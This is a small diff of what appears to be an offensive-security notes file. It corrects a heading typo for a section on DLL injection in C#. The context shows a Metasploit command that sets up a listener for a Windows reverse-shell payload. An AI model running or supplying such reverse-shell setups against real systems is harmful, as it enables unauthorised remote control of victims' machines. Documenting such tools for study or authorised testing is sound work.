@@ -46,7 +46,7 @@ return 0;
   msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/shell/reverse_tcp; exploit"
   ```
 
-### DLL Injection Wi Csharp
+### DLL Injection via Csharp
 
 Dllinjection.cs
 
